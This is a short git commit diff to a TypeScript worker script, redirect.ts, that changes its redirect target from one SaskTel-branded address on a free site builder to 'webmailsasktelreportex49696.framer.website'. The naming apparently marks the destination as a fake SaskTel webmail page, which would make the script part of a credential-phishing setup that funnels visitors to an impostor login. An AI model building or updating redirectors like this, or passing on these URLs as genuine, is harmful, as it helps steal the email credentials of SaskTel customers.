84811ac1a3e00d61427fc2ef3bfc5deb5a89c7e0
Gram77 <wonderland070@outlook.com>
2025-10-23 19:50:51 -0700

    Update redirect URL in redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://sasktel.sitew.ca/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://webmailsasktelreportex49696.framer.website/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
